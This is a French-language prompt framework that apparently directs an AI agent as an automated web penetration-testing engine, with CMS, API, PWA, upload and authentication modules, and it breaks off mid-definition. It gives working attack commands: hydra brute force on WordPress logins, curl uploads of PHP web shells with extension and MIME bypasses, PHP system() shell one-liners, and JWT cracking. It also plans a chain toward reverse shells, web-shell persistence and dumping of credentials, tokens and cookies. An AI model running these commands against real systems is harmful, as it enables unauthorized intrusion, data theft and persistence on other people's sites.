# 🌐 PROMPT STRATÉGIQUE : `engine_infra_web()`  
**Moteur de Pentest Web adaptatif, modulaire, heuristique, orchestration complète**  
> Conforme aux modèles avancés Cloud / AD / IoT / Network – avec typage abstrait, heuristique dynamique, déclencheurs MITRE/CVE, et ToolInstruction auto-adaptatifs.

---

## 🔷 [TYPE_ABSTRAIT] WebTarget

```plaintext
WebTarget {
    url: string,
    fqdn: string,
    ip: string,
    port: int,
    tls: boolean,
    waf_detected: boolean,
    tech_stack: [string],           // e.g. Apache, PHP, WordPress, React, Laravel
    exposed_paths: [string],        // e.g. /admin, /api/, /graphql
    app_architecture: string,       // CMS, SPA, PWA, API REST, etc.
    deployment: string,             // On-prem, Cloud, Serverless, CDN, CI/CD
    csp_policies: [string],
    open_ports: [int],
    metadata: any
}
```

---

## 🔷 [TYPE_ABSTRAIT] Signal

```plaintext
Signal {
    source: string,
    type: enum<TechStack | WAF | ErrorLeak | Directory | Endpoint | Misconfig | InputParam>,
    data: string,
    severity: enum<Low | Medium | High | Critical>,
    confidence: enum<Low | Medium | High>,
    timestamp: datetime
}
```

---

## 🔷 [TYPE_ABSTRAIT] Hypothesis

```plaintext
Hypothesis {
    vector: enum<XSS | SQLi | SSTI | RCE | IDOR | CSRF | SSRF | LFI | JWT | RateLimit | PrivEsc>,
    signals: [Signal],
    mitre_ref: [TacticTechnique],
    cwe_refs: [CWE],
    tool_candidates: [string],
    exploitability: float,
    priority: enum<Optional | Recommended | Urgent>
}
```

---

## 🔷 [TYPE_ABSTRAIT] Experiment

```plaintext
Experiment {
    vector: string,
    prerequisite: string,
    command: string,
    expected_behavior: string,
    failover_plan: string,
    tag: enum<Passive | Active | Intrusive>,
    auto_escalate_on_success: boolean
}
```

---

## 🔷 [TYPE_ABSTRAIT] Observation

```plaintext
Observation {
    experiment: Experiment,
    output: string,
    success: boolean,
    logs: [string],
    artifacts: [string],
    escalate_to: string
}
```

---

## 🔷 [TYPE_ABSTRAIT] ToolInstruction

```plaintext
ToolInstruction {
    tool: string,
    args: string,
    purpose: string,
    pattern_matched: string,
    auto_exploit: boolean
}
```

---

## 🔷 [TYPE_ABSTRAIT] WebPentestStrategyNode

```plaintext
WebPentestStrategyNode {
    id: string,
    hypothesis: Hypothesis,
    steps: [Experiment],
    result: Observation,
    next: [WebPentestStrategyNode],
    terminal: boolean
}
```

---

## 🧠 Fonction Principale : `engine_infra_web(target: WebTarget)`

```plaintext
engine_infra_web(target):
    [1] Reconnaissance initiale passive/active :
        - DNS, whois, subdomain bruteforce
        - Technologies avec wappalyzer / whatweb / nuclei
        - Scan ports + services web (nmap, rustscan, httpx)
    
    [2] Analyse des patterns techniques :
        - Détection CMS, frameworks, endpoint sensibles
        - Fingerprint via toolchain
        - Détection de WAF + CloudFront / Akamai / Cloudflare
    
    [3] Génération d’hypothèses contextuelles :
        - Analyse des signaux faibles
        - Corrélation avec MITRE / CVE / CWE
        - Priorisation vectorielle dynamique

    [4] Déclenchement des modules suivants (conditionnels) :
        - `engine_web_cms()`
        - `engine_web_api()`
        - `engine_web_graphql()`
        - `engine_web_pwa()`
        - `engine_web_auth()`
        - `engine_web_upload()`
        - `engine_web_reverse_proxy()`
        - `engine_web_waf_bypass()`
        - `engine_web_server_side()` (SSRF/LFI/SSTI)
        - `engine_web_header_sec()`
        - `engine_web_frontend_js()`
        - `engine_web_devops()`
        - `engine_web_cicd()`
        - `engine_web_cloud_hosting()`
        - `engine_web_exploit_chain()`
        - `engine_web_session_abuse()`

    [5] Génération automatique d’outils et de scripts :
        - Scénarios customisés (BurpSuite Repeater / ZAP Fuzzer / custom exploit)
        - Génération Bash/Python per vector
        - Détection de faux positifs via itération + injection fine
    
    [6] Rapport adaptatif :
        - Format Markdown + JSON + PDF
        - Rapport manager + rapport technique
        - Table des TTP MITRE + Mapping CVE
```

## 🧠 🔄 Heuristique : `engine_infra_web_heuristic_engine()`

```plaintext
engine_infra_web_heuristic_engine(target: WebTarget) {
  
  🔍 Phase 1 : Reconnaissance Dynamique
  ├── DNS, WHOIS, Subdomain bruteforce (amass, subfinder, dnsx)
  ├── Port scan avancé (masscan, rustscan, nmap -sS -sV -O -Pn)
  ├── Fingerprinting tech (httpx, wappalyzer, whatweb)
  └── Résultat → injection dans WebTarget.tech_stack + WebTarget.app_architecture

  📑 Phase 2 : Détection de Patterns à Risque
  ├── CMS détecté (WordPress, Joomla, etc.) → trigger engine_web_cms()
  ├── Présence d’API (/api/, swagger.json) → trigger engine_web_api()
  ├── Endpoint GraphQL → trigger engine_web_graphql()
  ├── App = SinglePageApp ou PWA → trigger engine_web_pwa()
  ├── Présence /auth /login → engine_web_auth()
  ├── Form upload ou .php → engine_web_upload()
  ├── HTTP Headers détectés (X-Forwarded-For, etc.) → engine_web_reverse_proxy()
  ├── Server-side scripting détecté → engine_web_server_side()
  ├── jsdelivr, webpack, assets, map → engine_web_frontend_js()
  ├── .git, /.env, pipelines.yml → engine_web_devops() + engine_web_cicd()
  ├── DNS resolves AWS/Azure/GCP CDN → engine_web_cloud_hosting()
  └── Résultat → instanciation dynamique des sous-engines

  🧠 Phase 3 : Génération des Hypothèses
  ├── Pour chaque pattern détecté :
      → Création Hypothesis (e.g. {XSS via param}, {LFI via GET}, {JWT forgeable})
  ├── Priorisation par criticité (impact × exploitabilité × exposition)
  └── Corrélation avec MITRE ATT&CK + CWE + CVE publiques
  
  🔬 Phase 4 : Exécution de Scans & Tests
  ├── Déclenchement NSE Nmap + Nuclei + Nikto
  ├── ZAP scan automatique + Intercepter contextuel
  ├── Test actif des payloads injectables
  ├── Séquenceur + brute-forceur → Burp Suite Pro / ZAP / ffuf
  └── Génération observationnelle à chaque test

  📊 Phase 5 : Analyse des Résultats & Re-planification
  ├── Résultat négatif → changer de payload / outil
  ├── Résultat positif → escalade ou pivot (ex : de IDOR → PrivEsc)
  ├── Observation réussie → Enregistrement, création d’un exploit
  └── Chaque expérience enrichit la stratégie globale

  🔁 Phase 6 : Exploitation en Chaîne
  ├── Si RCE → pivote vers SSRF ou LFI → pivote vers Reverse Shell
  ├── Si XSS détecté → test de bypass CSP + token exfiltration
  ├── Si Auth Bypass → accès admin → escalate sur uploads
  ├── Si API → abuse des méthodes HTTP (PUT, PATCH, DELETE)
  └── Création automatique de scénario narratif dans rapport

  🧷 Phase 7 : Persistance, Exfiltration & Rapport
  ├── Injection de WebShell (php, aspx, jsp)
  ├── Dump credentials, token JWT, cookies via Chrome Session Replay
  ├── Génération de Proofs (.gif, screenshots, curl replay)
  ├── Rapport TTPs + liens CVE/CWE/MITRE
  └── Rédaction automatique d’un rapport PDF + Markdown + JSON

}
```

---

### 🎯 Modèle de stratégie dynamique (exemples de déclencheurs conditionnels)

```plaintext
IF WebTarget.tech_stack includes "WordPress":
    → engine_web_cms() with CMS=WordPress
    → nuclei -t cves/wordpress/ -u <url>

IF WebTarget.app_architecture == "API":
    → engine_web_api()
    → test auth bypass / token leak / REST misconfig

IF tech_stack contains NodeJS + Express + JWT:
    → test JWT_NONE algorithm + kid injection
    → launch engine_web_auth()

IF .map source file exposed in JS:
    → engine_web_frontend_js() → reverse engineering functions

IF 403 responses + CloudFront header:
    → engine_web_waf_bypass() → payload rotation / padding

IF Response Headers include "X-Amz-Id":
    → engine_web_cloud_hosting(AWS)
```

---

# ⚙️ `engine_web_cms()`: MOTEUR AVANCÉ CMS – Pentest Heuristique Profond

---

## 🧠 [TYPE_ABSTRAIT] HeuristicCMSModuleEngine
```python
HeuristicCMSModuleEngine {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(step: NextStep) → CommandePentest[]
}
```

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
    url: string,
    ip: string,
    headers: dict,
    technologies: [string],
    cookies: [string],
    js_files: [string],
    uri_list: [string],
    signals: [Signal],
    cms_detected: boolean,
    cms_family: WordPress | Joomla | Drupal | Magento | Other,
    known_plugins: [string],
    upload_points: [string],
    login_forms: [string],
    auth_mechanism: JWT | Session | Basic | OAuth,
}
```

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    source: HTML | JS | HTTP_Headers | URL_Pattern,
    content: string,
    match_type: CMS_Marker | URI_Login | Upload_Form | Plugin_Identifier,
    confidence: Low | Medium | High
}
```

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
    cve_match: [CVE],
    plugin_vulnerable: boolean,
    file_upload_possible: boolean,
    bruteforce_possible: boolean,
    impact: Low | Medium | High | Critical
}
```

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    description: string,
    tool: string,
    input: string,
    expected_result: string,
    preconditions: string,
    postconditions: string
}
```

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
    success: boolean,
    output: string,
    metadata: any,
    derived_hypotheses: [Hypothesis]
}
```

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    strategy: enum<Bruteforce | ExploitUpload | ExploitPlugin | DumpDB | PivotShell | BypassAuth>,
    target_component: string,
    rationale: string,
    command: CommandePentest
}
```

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    tool: string,
    cmd: string,
    description: string,
    when_to_trigger: string
}
```

---

## 🔎 PHASE 1 : Reconnaissance CMS – Signaux d’Observation
- URI Patterns : `/wp-login.php`, `/administrator`, `/sites/all`, `/media/upload`, `/magento/`
- Headers : `X-Powered-By`, `X-Generator`, `Set-Cookie` (`CMSSESSID`, `drupal_uid`, `mage-bucket`)
- HTML : `<!-- Powered by Joomla -->`, `src="/wp-content/`, `drupal.js`, `mage-init.js`
- Outils : `whatweb`, `wappalyzer`, `builtwith`, `nuclei -t technologies/`

---

## 🧠 PHASE 2 : Construction d’Hypothèses
| Pattern détecté      | Hypothèse                          | Outils possibles                     |
|----------------------|------------------------------------|--------------------------------------|
| wp-login.php         | CMS WordPress                      | `wpscan`, `nuclei`, `hydra`          |
| Plugins WP détectés  | Failles CVE plugin vulnérable      | `wpscan --enumerate`, `nuclei`       |
| admin/ ou /login     | Bruteforce possible                | `hydra`, `wpscan`, `cewl`            |
| Upload media         | Upload shell possible              | `curl`, `burp`, `nuclei upload`      |
| HTML comment CMS     | Détail version → mapping CVE       | `cve-search`, `exploitdb`            |

---

## 🧪 PHASE 3 : Expérimentations stratégiques

### 🔹 WordPress Bruteforce
```bash
hydra -L users.txt -P rockyou.txt target http-post-form "/wp-login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

### 🔹 WPScan bruteforce + enum plugins
```bash
wpscan --url https://target --enumerate u,p --plugins-detection aggressive
```

### 🔹 DrupalScan + Droopescan
```bash
droopescan scan drupal -u https://target
```

### 🔹 Upload Shell
```bash
curl -F "file=@shell.php" https://target/wp-content/uploads/
```

---

## 🧠 PHASE 4 : Déclenchements conditionnels intelligents

| Condition                                             | Action                           |
|------------------------------------------------------|----------------------------------|
| Plugin vulnérable identifié + CVE                    | CVE lookup + PoC exploit         |
| Présence page Upload                                 | Test `.php` upload + bypass MIME |
| Login présent + erreurs visibles                     | Bruteforce                       |
| Accès admin panel                                    | Dump database + config.php       |
| Shell PHP accessible                                 | Pivot via enumeration + LPE      |

---

## 📤 PHASE 5 : Réactions exploitatives

| Objectif                    | Tactique                                                   |
|-----------------------------|------------------------------------------------------------|
| Dump DB                     | SQLMap, WPScan dump, phpMyAdmin abuse                      |
| Shell Reverse               | Upload via Media / Plugins                                 |
| Post-Exploitation WP        | `wp-config.php`, `users`, `themes`, `timthumb` exploit     |
| Plugin Abuse                | CVE → `wpsploit`, `exploitdb`, PoC public                  |
| Privilege Escalation Shell  | `linpeas.sh`, `pspy`, `user enum`, `wp_user_meta` abuse    |

---

## 📁 PHASE 6 : Génération Automatisée

| Script             | Description                                 |
|--------------------|---------------------------------------------|
| `wp_brute.bat`     | Bruteforce admin login                      |
| `wp_enum.sh`       | Plugin/theme/vers dump                      |
| `upload_exploit.sh`| Upload et test reverse shell                |
| `cms_exploit.nse`  | Script Nmap NSE d’attaque CMS               |

---

## 📂 PHASE 7 : OUTPUT LOGS

```
/output/web/<target>/cms/wpscan_plugins.txt
/output/web/<target>/cms/login_brute.log
/output/web/<target>/cms/upload_shell_result.log
/output/web/<target>/cms/cve_exploits_applied.txt
/output/web/<target>/cms/post_exploitation_notes.md
```

---

## 📌 MAPPINGS STANDARDS
- MITRE : `T1190`, `T1110.001`, `T1133`, `T1078`, `T1059`
- CWE : `CWE-287`, `CWE-434`, `CWE-798`, `CWE-601`
- CVEs : `CVE-2021-24294`, `CVE-2022-29455`, `CVE-2023-30799`, etc.

---

# ⚙️ `engine_web_api()`: MOTEUR AVANCÉ API – Pentest Heuristique des Endpoints Exposés

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebAPIModule
```python
HeuristicWebAPIModule {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(step: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
    url: string,
    ip: string,
    headers: dict,
    js_code: [string],
    openapi_found: boolean,
    graphql_found: boolean,
    api_tokens: [string],
    jwt_tokens: [string],
    api_versioning: boolean,
    verbs_supported: [GET | POST | PUT | DELETE | PATCH],
    parameters_detected: [string],
    signals: [Signal]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    source: HTTP_Header | JS_Snippet | Swagger_File | GraphQL_Schema,
    type: TokenLeak | JWT | Verb | Swagger | GraphQL,
    confidence: Low | Medium | High,
    content: string
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
    weakness: enum<JWTWeakKey | BOLA | Injection | VerbTampering | Deserialization>,
    evidence: [Signal],
    probable_cwe: [CWE],
    impact: Low | Medium | High | Critical,
    exploitable: boolean
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    description: string,
    tool: string,
    cmd: string,
    expected: string,
    preconditions: string,
    category: enum<Recon | Exploit | Fuzz | Auth_Bypass>
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
    success: boolean,
    result: string,
    impact_level: Low | Medium | High | Critical,
    next_hypothesis: [Hypothesis]
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    strategy: enum<ExploitJWT | AbuseToken | Replay | SchemaFuzz | GraphQLInjection | BOLAExploit>,
    triggered_on: Observation,
    command: CommandePentest
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    tool: string,
    command: string,
    description: string,
    execution_trigger: string
}
```

---

## 🔎 PHASE 1 : Observation & Signaux API
| Source        | Détails |
|---------------|---------|
| Headers       | `X-Api-Version`, `Content-Type: application/json`, `Authorization: Bearer` |
| URIs          | `/api/`, `/v1/`, `/swagger`, `/graphql`, `/openapi.json`, `/docs` |
| JS Patterns   | `axios.post`, `fetch('/api')`, `client.query(...)` |
| Verbes exposés| `OPTIONS`, `PUT`, `PATCH` → potentielle attaque verb tampering |

---

## 💡 PHASE 2 : Matching & Hypothèses
| Signal détecté                        | Hypothèse générée                  |
|--------------------------------------|------------------------------------|
| JWT présent dans JS                  | JWT brute-force / HS256            |
| Swagger JSON public                  | Fuzz endpoints + schema injection  |
| Verbes anormaux                      | Verb Tampering                     |
| `?token=` dans l’URL                 | API Key Reuse                      |
| GraphQL endpoint                     | Introspection / Injection          |

---

## 🧪 PHASE 3 : Test Plans stratégiques

### 🔹 JWT Bruteforce
```bash
jwt_tool token.jwt -C -d wordlist.txt
```

### 🔹 Schema Fuzz (Swagger/OpenAPI)
```bash
nuclei -t misconfiguration/openapi-misconfig.yaml -u https://target
```

### 🔹 Verb Tampering
```bash
curl -X PUT https://target/api/user/1 -d '{"role":"admin"}'
curl -X GET https://target/api/user/delete/1
```

### 🔹 API Key Abuse
```bash
nuclei -u https://target/api/ -t exposed-tokens/
```

### 🔹 BOLA Fuzz
```bash
burp intruder → inject sur `/api/user?id=2`, valeurs de 1 à 1000
```

---

## 🧠 PHASE 4 : Exécution conditionnelle

| Condition                          | Déclenchement                     |
|-----------------------------------|-----------------------------------|
| Swagger trouvé                    | Analyse avec `swagger-codegen`   |
| JWT HS256 faible                  | jwt_tool crack + replay          |
| GraphQL introspection possible    | `graphqlmap` + injection         |
| Verb Tampering détecté            | fuzz sur POST/PUT/DELETE         |
| API Token exposé                  | tester endpoints avec token      |

---

## 🎯 PHASE 5 : Réactions stratégiques

| Impact obtenu       | Action déclenchée                        |
|---------------------|------------------------------------------|
| Auth bypass JWT     | Dump data admin / pivot API              |
| GraphQL injection   | Extraction DB → introspection + aliasing |
| Token Abuse         | Recon & replay avec d'autres endpoints   |
| BOLA trouvé         | Dump users / bookings / PII              |

---

## 📁 PHASE 6 : Génération de scripts
| Script Name             | Description                                 |
|-------------------------|---------------------------------------------|
| `jwt_bruteforce.sh`     | Brute-force JWT avec wordlist               |
| `api_token_scan.bat`    | Scan endpoints tokenisés                    |
| `graphql_injection.py`  | Fuzz introspection et injection             |
| `verb_tamper.bat`       | Test automatisé PUT/GET/POST endpoints      |
| `api_bola_fuzz.sh`      | Enumération utilisateurs via ID             |

---

## 📂 PHASE 7 : OUTPUT LOG

```
/output/web/<target>/api/jwt_bypass.log
/output/web/<target>/api/swagger_fuzz.log
/output/web/<target>/api/graphqli_enum.txt
/output/web/<target>/api/token_scan_results.txt
/output/web/<target>/api/verb_abuse_attempts.log
```

---

## 🧭 MAPPING STRATÉGIQUE

- **MITRE ATT&CK** :
  - `T1136.001` (Access Token)
  - `T1110.002` (Brute Force JWT)
  - `T1203` (Exploitation for Client Execution)
  - `T1003` (Credential Dumping)

- **CWE** :
  - `CWE-287` (Improper Auth)
  - `CWE-522` (Insufficiently Protected Credentials)
  - `CWE-601` (Open Redirect)
  - `CWE-306` (Missing Auth for Critical Function)

---

# ⚙️ `engine_web_pwa()`: MOTEUR STRATÉGIQUE DE PENTEST PROGRESSIVE WEB APP (PWA)

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebPWAModule
```python
HeuristicWebPWAModule {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(step: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
    url: string,
    manifest_found: boolean,
    service_worker_found: boolean,
    cache_api_used: boolean,
    offline_routes: [string],
    manifest_config: dict,
    sw_entrypoints: [string],
    pwa_signals: [Signal]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    origin: string,
    type: Manifest | ServiceWorker | CacheControl | JSCode,
    confidence: Low | Medium | High,
    details: string
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
    type: enum<CachePoisoning | SWHijack | ManifestInjection | PersistenceOffline>,
    impact: Low | Medium | High | Critical,
    associated_signals: [Signal],
    test_plan: [Experiment],
    priority: int
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    name: string,
    cmd: string,
    expected: string,
    category: enum<Recon | Inject | Simulate | Exploit>,
    precondition: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
    result: string,
    vulnerable: boolean,
    comments: string,
    escalation_possible: boolean
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    description: string,
    if_observation: Observation,
    reaction: CommandePentest
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    tool: string,
    full_command: string,
    objective: string,
    output_file: string
}
```

---

## 🔎 PHASE 1 : Observation Initiale

| Élément              | Commande                                                 |
|----------------------|----------------------------------------------------------|
| Manifest             | `curl -s https://target/manifest.json | jq .`            |
| Service Worker       | `curl -s https://target/sw.js`                           |
| JS Static            | `feroxbuster -u https://target -x .js,.json --depth 2`   |
| Routes Offline       | `grep "/offline"` ou `/index.html`                       |
| Permissions Manifest | `grep "permissions" manifest.json`                       |

---

## 💡 PHASE 2 : Matching Hypothèses

| Signal détecté                            | Hypothèse                                 |
|-------------------------------------------|-------------------------------------------|
| `start_url` non-sanitized                 | XSS via Manifest Injection                |
| SW intercepte tout `/`                    | Hijack / Persistence                      |
| Cache API `caches.open()` détecté         | Poisoning Cache + Offline Payload         |
| fetch() avec `install` → inject response  | Offline Injection Attack                  |
| JS route `/offline` détectée              | Contourner Auth via route cachée          |

---

## 🧪 PHASE 3 : Test Plans

### 🔹 Analyse Manifest JSON
```bash
curl -s https://target/manifest.json | jq .
grep -i "start_url" manifest.json
test XSS inject: "start_url": "<script>alert(1)</script>"
```

### 🔹 Analyse Service Worker
```bash
curl -s https://target/sw.js
grep -i "fetch" sw.js
grep -i "caches.open" sw.js
```

### 🔹 Cache Poison
```bash
curl -X GET "https://target/index.html" -H "Referer: https://evil.com"
```

### 🔹 JS Endpoint Explorer
```bash
feroxbuster -u https://target -x .js,.json --depth 2
```

### 🔹 Analyse Devtools Mode Offline
```text
Chrome DevTools > Application > ServiceWorker > Go Offline
inject payload via devtools "Cache → index.html"
```

---

## ⚙️ PHASE 4 : Exécution conditionnelle & Raisonnement

| Condition détectée                        | Action recommandée                        |
|-------------------------------------------|-------------------------------------------|
| Service worker présent + catch-all route  | Fuzz offline payload cache injection      |
| Manifest injection possible               | Inject JS dans start_url / name           |
| Fetch intercept & Cache API               | Re-route vers shell cache                 |
| Route `/offline` avec logic               | Abuse offline fallback                    |

---

## 🎯 PHASE 5 : Réactions Automatisées

| Résultat                               | Étapes suivantes                                 |
|----------------------------------------|--------------------------------------------------|
| XSS dans Manifest                      | Script XSS de persistance                        |
| Hijack cache réussi                    | Inject payloads persistants                      |
| Service Worker malveillant injecté     | Persistence de payload même hors ligne          |
| Analyse Devtools montre attaque       | Création rapport + extractions POST-mortem      |

---

## 📁 PHASE 6 : SCRIPTS AUTOMATIQUES

| Script                   | Description                                    |
|--------------------------|------------------------------------------------|
| `pwa_manifest_xss.sh`    | Injection JS dans manifest et validation       |
| `sw_hijack.sh`           | Simule cache overwrite via fetch hijack        |
| `cache_poison.sh`        | Injection réponse via Referer Spoofing         |
| `offline_route_enum.sh`  | Scan des routes hors ligne                     |

---

## 📂 PHASE 7 : OUTPUT STRUCTURÉ

```
/output/web/<target>/pwa/manifest_xss_detected.log
/output/web/<target>/pwa/service_worker_behavior.md
/output/web/<target>/pwa/cache_poisoning_attempts.log
/output/web/<target>/pwa/offline_routes_enum.txt
```

---

## 📌 MAPPING STRATÉGIQUE

- **MITRE ATT&CK** :
  - `T1499.001` – Service Worker Abuse
  - `T1547.009` – Application Shimming / Offline Hijack
  - `T1211` – Exploitation of Trusted Functionality

- **CWE** :
  - `CWE-79` (Cross-Site Scripting)
  - `CWE-829` (Inclusion of Functionality from Untrusted Control Sphere)
  - `CWE-16` (Configuration Errors)

---

# 📤 `engine_web_upload()` — MODULE STRATÉGIQUE POUR L'ABUS DE MÉCANISMES D’UPLOAD WEB

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebUploadModule
```python
HeuristicWebUploadModule {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(step: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
    url: string,
    upload_paths: [string],
    upload_inputs: [string],
    js_upload_handlers: [string],
    exposed_directories: [string],
    headers: [string],
    content_disposition_fields: [string],
    raw_signals: [Signal]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    source: string,
    type: HTMLInput | JSFunction | URLPattern | MIMEResponse,
    description: string,
    confidence: Low | Medium | High
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
    type: enum<UploadRCE | UploadTraversal | UploadBypass | UploadPoison | UploadRebind>,
    evidence: [Signal],
    severity: Low | Medium | High | Critical,
    test_plan: [Experiment]
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    name: string,
    cmd: string,
    objective: string,
    preconditions: [string],
    category: enum<Recon | Bypass | Exploit | Persist>,
    post_check: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
    outcome: string,
    vulnerable: boolean,
    response_code: int,
    notes: string
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    description: string,
    trigger: Observation,
    recommended_reaction: CommandePentest
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    tool: string,
    full_command: string,
    goal: string,
    output_log: string
}
```

---

## 🔎 PHASE 1 — Reconnaissance : Signaux d’Upload

| Élément                       | Exemple de commande                                    |
|-------------------------------|--------------------------------------------------------|
| Détection de formulaire       | `curl https://target | grep "enctype"`                |
| JS Upload                     | `feroxbuster -x .js | grep FormData`                  |
| URI Upload                    | `ffuf -u https://target/FUZZ -w upload.txt`           |
| Pattern upload multi-part     | `burp -> Logger → analyse Content-Disposition`         |

---

## 💡 PHASE 2 — Matching Hypothèses Stratégiques

| Symptôme                                          | Hypothèse formée                        |
|--------------------------------------------------|------------------------------------------|
| Fichier exécutable accepté                       | UploadRCE                               |
| Upload accepté mais renommé                      | UploadRebind                             |
| JS-only validation visible                       | UploadBypassClient                       |
| Content-Type contrôlable                         | MIME Spoof (UploadPoison)                |
| Double extension ou LFI wrapper                  | UploadTraversal                          |

---

## 🧪 PHASE 3 — Plans de test détaillés

### 🔹 Tests d’upload bruts
```bash
curl -F "file=@cmd.php" https://target/upload
curl -F "file=@shell.jpg.php" -H "Content-Type: image/jpeg" https://target/media/new
```

### 🔹 Bypass d’extension
```bash
curl -F "file=@shell.pHp5" https://target/admin/import
curl -F "file=@shell.asp;.jpg" https://target/import
```

### 🔹 Contournement MIME
```bash
curl -F "file=@webshell.php" -H "Content-Type: image/png"
exiftool -Comment='<?php system($_GET["cmd"]); ?>' payload.jpg
```

### 🔹 Vérification de l’upload
```bash
curl https://target/uploads/shell.php
feroxbuster -u https://target/uploads -x php,jpg,png,txt
```

### 🔹 Wrapping LFI (advanced)
```bash
echo '<?php system($_GET["cmd"]); ?>' > php_shell
zip --junk-paths shell.zip php_shell
curl -F "file=@shell.zip" https://target/upload
```

---

## 🤖 PHASE 4 — Logique d’exécution conditionnelle

| Condition détectée                          | Action déclenchée                        |
|---------------------------------------------|------------------------------------------|
| Upload PHP réussi                           | Shell → Enum Système + Lateral Move     |
| MIME rejeté                                 | Test bypass : Content-Type spoofing     |
| Upload accessible                           | Reverse shell + persist                  |
| .htaccess block                             | Tentative brute-force dir / LFI          |

---

## 🎯 PHASE 5 — Réactions Dynamiques & Modules complémentaires

| Observation                                  | Réaction stratégique                     |
|---------------------------------------------|------------------------------------------|
| shell.php accessible                        | module_web_shell_spawn()                |
| payload uploadé mais non accessible         | module_web_lfi_probe()                  |
| erreur .htaccess                            | module_web_directory_override()         |
| MIME rejeté                                 | module_web_mime_spoof()                 |

---

## ⚙️ PHASE 6 — Scripts Automatisés

| Script                    | Description                                          |
|---------------------------|------------------------------------------------------|
| `upload_test.sh`          | Upload brut + bypass                                |
| `verify_shell.sh`         | Vérifie si le shell est actif                       |
| `spoof_mime.sh`           | Upload avec header Content-Type + exif              |
| `upload_reverse.sh`       | Envoie payload reverse shell + netcat handler       |

---

## 📁 PHASE 7 — SORTIES STRUCTURÉES

```
/output/web/<target>/upload/upload_success.log
/output/web/<target>/upload/rejected_extensions.txt
/output/web/<target>/upload/shell_accessed.log
/output/web/<target>/upload/mime_spoof_attempts.log
```

---

## 📌 MAPPING STRATÉGIQUE

- **MITRE ATT&CK** :
  - `T1190` — Exploit Public-Facing Application
  - `T1105` — Remote File Copy
  - `T1136.001` — Create Account: Local Account (Persistence via RCE)

- **CWE** :
  - `CWE-434` — Unrestricted Upload of File with Dangerous Type
  - `CWE-116` — Improper Encoding or Escaping of Output
  - `CWE-93` — Improper Neutralization of CRLF Sequences

---

# 🔐 `engine_web_auth()` — MODULE STRATÉGIQUE : AUTHENTIFICATION WEB & BYPASS

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebAuthModule
```python
HeuristicWebAuthModule {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(step: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
    url: string,
    login_paths: [string],
    auth_tokens: [string],
    cookies: [string],
    headers: [string],
    sso_endpoints: [string],
    js_auth_flows: [string],
    raw_signals: [Signal]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    source: string,
    type: enum<Cookie | Header | URL | JS | AuthError>,
    description: string,
    confidence: Low | Medium | High
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
    type: enum<Bruteforce | JWTWeak | TokenFixation | SSOBypass | OAuthHijack | CookieTamper>,
    evidence: [Signal],
    severity: Low | Medium | High | Critical,
    test_plan: [Experiment]
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    name: string,
    cmd: string,
    goal: string,
    preconditions: [string],
    category: enum<Recon | Exploit | Bypass | Persist | Escalate>,
